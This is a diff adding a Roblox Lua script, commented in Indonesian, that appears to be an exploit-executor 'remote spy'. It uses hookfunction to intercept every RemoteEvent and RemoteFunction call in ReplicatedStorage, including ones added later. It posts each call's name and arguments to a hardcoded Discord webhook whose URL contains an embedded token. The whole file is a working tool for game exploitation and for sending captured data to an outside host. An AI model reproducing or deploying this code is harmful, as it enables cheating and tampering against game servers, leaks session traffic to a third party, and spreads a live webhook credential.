@@ -1,0 +1,43 @@
+-- 🔹 CONFIG
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1401351433688977508/nhlle6MOutCekvXpPigGeUZIs9prWpQS74YzjCP9CEK43nQFnDnmPt8ZoTUTUi65lTB4"
+
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Fungsi kirim pesan ke Discord
+local function sendToDiscord(content)
+    local data = {
+        ["content"] = content
+    }
+    local jsonData = HttpService:JSONEncode(data)
+    HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
+end
+
+-- Hook RemoteEvent & RemoteFunction
+local function hookRemote(obj)
+    if obj:IsA("RemoteEvent") then
+        local old; old = hookfunction(obj.FireServer, function(self, ...)
+            local args = {...}
+            local str = "[RemoteEvent] " .. self.Name .. " | Args: " .. HttpService:JSONEncode(args)
+            sendToDiscord(str)
+            return old(self, unpack(args))
+        end)
+    elseif obj:IsA("RemoteFunction") then
+        local old; old = hookfunction(obj.InvokeServer, function(self, ...)
+            local args = {...}
+            local str = "[RemoteFunction] " .. self.Name .. " | Args: " .. HttpService:JSONEncode(args)
+            sendToDiscord(str)
+            return old(self, unpack(args))
+        end)
+    end
+end
+
+-- Hook semua remote yang ada sekarang
+for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+        hookRemote(v)
+    end
+end
+
+-- Hook remote baru kalau muncul belakangan
+ReplicatedStorage.DescendantAdded:Connect(hookRemote)
